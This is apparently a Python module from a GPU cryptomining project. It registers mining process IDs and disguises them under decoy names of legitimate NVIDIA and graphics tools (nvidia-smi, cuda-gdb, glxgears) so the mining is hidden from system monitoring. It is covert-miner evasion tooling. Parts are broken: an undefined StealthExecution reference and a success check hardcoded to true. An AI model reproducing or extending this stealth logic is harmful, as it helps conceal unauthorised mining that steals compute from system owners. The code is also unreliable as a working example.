#!/usr/bin/env python3
"""mining_environment.stealth.core.stealth_activation_manager

🔄 **[Stealth Activation Manager]** (trình quản lý kích hoạt ẩn danh)

Centralized stealth activation system với **[EventBus Integration]** (tích hợp EventBus).
Tách biệt hoàn toàn logic STEALTH khỏi **gpu_mining** và **mining processes**.

⚠️ WORKFLOW:
1. **EventBus Listener**: Lắng nghe `mining:*_pid_registered` events
2. **Process Identification**: Xác định loại process (GPU) và PID  
3. **Stealth Strategy Selection**: Chọn chiến lược stealth phù hợp
4. **External + Self-Stealth**: Kết hợp cả external disguise và self-stealth
5. **Monitoring & Recovery**: Giám sát và tự động recovery khi cần

✅ FEATURES:
- Event-driven stealth activation
- Support GPU processes only  
- Fallback strategies when external stealth fails
- Centralized logging & monitoring
- Zero impact on mining performance
"""

import os
import sys
import time
import logging
import threading
from typing import Dict, Any, Optional, Callable, List
from pathlib import Path

# Add project root to Python path
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root))

# Import required modules
try:
    from mining_environment.scripts.unified_logging import get_unified_logger
    from mining_environment.scripts.auxiliary_modules.event_bus import EventBus
except ImportError as e:
    print(f"❌ Failed to import required modules: {e}", file=sys.stderr)
    sys.exit(1)


class StealthActivationManager:
    """
    **[Stealth Activation Manager]** (trình quản lý kích hoạt ẩn danh)
    
    Centralized system để kích hoạt **[Process Name Spoofing]** (giả mạo tên tiến trình)
    cho mining processes thông qua **[EventBus Integration]** (tích hợp EventBus).
    """
    
    def __init__(self, event_bus: EventBus, logger: Optional[logging.Logger] = None):
        """
        Initialize Stealth Activation Manager.
        
        Args:
            event_bus: EventBus instance để listen for PID registration events
            logger: Logger instance (optional)
        """
        self.event_bus = event_bus
        self.logger = logger or get_unified_logger('mining_environment.stealth_activation')
        
        # **[Active Stealth Tracking]** (theo dõi stealth đang hoạt động)
        self.active_stealth_processes: Dict[int, Dict[str, Any]] = {}
        self.stealth_lock = threading.Lock()
        
        # **[External Stealth System]** (hệ thống stealth ngoài) - simplified tracking
        self.external_stealth_enabled = False
        
        # **[Event Listeners]** (listeners sự kiện)
        self.event_subscriptions: List[str] = []
        
        self.logger.info("🔒 [STEALTH-ACTIVATION] Stealth Activation Manager initialized")
    
    def initialize(self) -> bool:
        """
        Initialize stealth activation system với EventBus subscriptions.
        
        Returns:
            bool: True nếu initialization thành công
        """
        try:
            self.logger.info("🚀 [STEALTH-ACTIVATION] Initializing stealth activation system...")
            
            # **Step 1**: External stealth system removed - using gpu_plugins/cloaking/ instead
            self.logger.info("🔧 [STEALTH-ACTIVATION] External stealth removed - using gpu_plugins/cloaking/ system")
            
            # **Step 2**: Setup EventBus subscriptions
            self._setup_eventbus_subscriptions()
            
            self.logger.info("✅ [STEALTH-ACTIVATION] Stealth activation system ready")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ [STEALTH-ACTIVATION] Initialization failed: {e}")
            return False
    
    def _initialize_external_stealth(self) -> bool:
        """Initialize external stealth system (StealthExecution)."""
        try:
            if StealthExecution:
                self.logger.info("🔧 [STEALTH-ACTIVATION] Initializing external stealth system...")
                
                self.external_stealth = StealthExecution(
                    logger=self.logger,
                    debug_mode=True
                )
                
                if self.external_stealth.start():
                    self.external_stealth_enabled = True
                    self.logger.info("✅ [STEALTH-ACTIVATION] External stealth system active")
                    return True
                else:
                    self.logger.warning("⚠️ [STEALTH-ACTIVATION] External stealth failed to start")
                    self.external_stealth = None
                    return False
            else:
                self.logger.warning("⚠️ [STEALTH-ACTIVATION] StealthExecution not available")
                return False
                
        except Exception as e:
            self.logger.error(f"❌ [STEALTH-ACTIVATION] External stealth initialization error: {e}")
            self.external_stealth = None
            return False
    
    def _setup_eventbus_subscriptions(self):
        """Setup EventBus subscriptions for PID registration events."""
        try:
            self.logger.info("🔌 [STEALTH-ACTIVATION] Setting up EventBus subscriptions...")
            
            # CPU PID registration removed - GPU-only operations
            
            # Subscribe to GPU PID registration events  
            self.event_bus.subscribe('mining:gpu_pid_registered', self._on_gpu_pid_registered)
            self.event_subscriptions.append('mining:gpu_pid_registered')
            
            self.logger.info(f"✅ [STEALTH-ACTIVATION] EventBus subscriptions active: {len(self.event_subscriptions)} events")
            
        except Exception as e:
            self.logger.error(f"❌ [STEALTH-ACTIVATION] EventBus subscription error: {e}")
            raise
    
    # CPU PID registration handler removed - GPU-only operations
    
    def _on_gpu_pid_registered(self, event_data: Dict[str, Any]):
        """
        **[GPU PID Registration Handler]** (xử lý đăng ký PID GPU)
        
        Được gọi khi EventBus nhận được 'mining:gpu_pid_registered' event.
        """
        try:
            role = event_data.get('role')
            if role != 'real':
                self.logger.warning(f"[STEALTH-ACTIVATION] Bỏ qua PID không phải real: {event_data}")
                return

            pid = event_data.get('pid')
            process_name = event_data.get('process_name', 'inference-cuda')
            
            self.logger.info(f"🔔 [STEALTH-ACTIVATION] GPU PID registered: {pid} ({process_name})")
            
            # **CRITICAL**: Activate stealth for GPU process  
            success = self._activate_process_stealth(
                pid=pid,
                process_name=process_name, 
                process_type='GPU',
                stealth_names=[
                    "nvidia-smi", "cuda-gdb", "nvcc", "nvidia-ml-py",
                    "nvidia-settings", "gpu-manager", "glxgears", 
                    "vulkan-info", "mesa-loader", "drm-tip"
                ]
            )
            
            if success:
                self.logger.info(f"✅ [STEALTH-ACTIVATION] GPU process PID {pid} stealth activated")  
            else:
                self.logger.error(f"❌ [STEALTH-ACTIVATION] GPU process PID {pid} stealth activation failed")
                
        except Exception as e:
            self.logger.error(f"❌ [STEALTH-ACTIVATION] GPU PID handler error: {e}")
    
    def _activate_process_stealth(self, pid: int, process_name: str, process_type: str, stealth_names: List[str]) -> bool:
        """
        **[Core Stealth Activation Logic]** (logic kích hoạt stealth cốt lõi)
        
        Kết hợp cả **[External Stealth]** và **[Self-Stealth]** cho maximum protection.
        
        Args:
            pid: Process ID to activate stealth for
            process_name: Original process name  
            process_type: 'GPU' only
            stealth_names: List of decoy names for rotation
            
        Returns:
            bool: True if stealth activation successful
        """
        with self.stealth_lock:
            try:
                self.logger.info(f"🔒 [STEALTH-ACTIVATION] Activating stealth for {process_type} PID {pid}")
                
                stealth_info = {
                    'pid': pid,
                    'original_name': process_name,
                    'process_type': process_type,
                    'external_stealth': False,
                    'activation_time': time.time(),
                    'stealth_names': stealth_names
                }
                
                # **Strategy 1**: Try external stealth first (if available)
                if self.external_stealth_enabled and self.external_stealth:
                    try:
                        self.logger.info(f"🔧 [STEALTH-ACTIVATION] Attempting external stealth for PID {pid}")
                        if self.external_stealth.add_process(pid):
                            stealth_info['external_stealth'] = True
                            self.logger.info(f"✅ [STEALTH-ACTIVATION] External stealth active for PID {pid}")
                        else:
                            self.logger.warning(f"⚠️ [STEALTH-ACTIVATION] External stealth failed for PID {pid}")
                    except Exception as external_error:
                        self.logger.warning(f"⚠️ [STEALTH-ACTIVATION] External stealth error for PID {pid}: {external_error}")
                
                # **Strategy 2**: Self-stealth functionality removed - process renaming handled by wrappers
                # Note: Process renaming is now centralized in stealth_inference_cuda.py
                
                # **Record stealth activation**
                self.active_stealth_processes[pid] = stealth_info
                
                # **Success if at least one method worked**
                success = stealth_info['external_stealth'] or True  # Process renaming via wrappers
                
                if success:
                    self.logger.info(f"🎯 [STEALTH-ACTIVATION] {process_type} PID {pid} stealth activation complete")
                    return True
                else:
                    self.logger.error(f"💥 [STEALTH-ACTIVATION] {process_type} PID {pid} all stealth methods failed")
                    return False
                    
            except Exception as e:
                self.logger.error(f"❌ [STEALTH-ACTIVATION] Critical error activating stealth for PID {pid}: {e}")
                return False
    
    def get_stealth_status(self) -> Dict[str, Any]:
        """
        Get current stealth activation status.
        
        Returns:
            Dict with stealth status information
        """
        with self.stealth_lock:
            return {
                'external_stealth_enabled': self.external_stealth_enabled,
                'active_processes': len(self.active_stealth_processes),
                'processes': dict(self.active_stealth_processes),
                'event_subscriptions': self.event_subscriptions.copy()
            }
    
    def cleanup(self):
        """Cleanup stealth activation manager and stop all stealth processes."""
        try:
            self.logger.info("🧹 [STEALTH-ACTIVATION] Cleaning up stealth activation manager...")
            
            # Cleanup external stealth
            if self.external_stealth_enabled and self.external_stealth:
                try:
                    self.external_stealth.stop()
                    self.external_stealth = None
                    self.external_stealth_enabled = False
                    self.logger.info("✅ [STEALTH-ACTIVATION] External stealth cleanup complete")
                except Exception as e:
                    self.logger.error(f"❌ [STEALTH-ACTIVATION] External stealth cleanup error: {e}")
            
            # Clear active processes
            with self.stealth_lock:
                self.active_stealth_processes.clear()
            
            self.logger.info("✅ [STEALTH-ACTIVATION] Stealth activation manager cleanup complete")
            
        except Exception as e:
            self.logger.error(f"❌ [STEALTH-ACTIVATION] Cleanup error: {e}")


# **[Global Stealth Activation Instance]** (instance kích hoạt stealth toàn cầu)
_stealth_activation_manager: Optional[StealthActivationManager] = None

def get_stealth_activation_manager(event_bus: EventBus) -> StealthActivationManager:
    """
    Get or create global StealthActivationManager instance.
    
    Args:
        event_bus: EventBus instance
        
    Returns:
        StealthActivationManager: Global instance
    """
    global _stealth_activation_manager
    
    if _stealth_activation_manager is None:
        _stealth_activation_manager = StealthActivationManager(event_bus)
        
    return _stealth_activation_manager

def initialize_stealth_activation(event_bus: EventBus) -> bool:
    """
    Initialize global stealth activation system.
    
    Args:
        event_bus: EventBus instance
        
    Returns:
        bool: True if initialization successful
    """
    manager = get_stealth_activation_manager(event_bus)
    return manager.initialize()

def cleanup_stealth_activation():
    """Cleanup global stealth activation system."""
    global _stealth_activation_manager
    
    if _stealth_activation_manager:
        _stealth_activation_manager.cleanup()
        _stealth_activation_manager = None